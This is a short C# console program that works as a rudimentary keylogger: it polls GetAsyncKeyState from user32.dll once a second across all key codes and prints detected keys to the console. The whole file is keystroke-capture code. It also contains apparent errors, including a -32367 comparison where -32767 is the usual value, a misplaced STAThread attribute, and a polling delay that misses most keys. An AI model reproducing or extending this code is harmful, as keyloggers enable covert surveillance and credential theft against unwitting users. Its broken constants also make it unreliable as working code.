using System;
using System.Threading;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace key1
{
    class Program
    {
        [STAThread]
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        static void Logger()
        {
            while (true)
            {
                Thread.Sleep(1000);
                for (int i = 0; i < 255; i++)
                {
                    int Key = GetAsyncKeyState(i);
                    if (Key == 1 || Key == -32367) Console.WriteLine((Keys)i);
                }
            }
        }
        static void Main()
        {
            Logger();
        }
    }
}
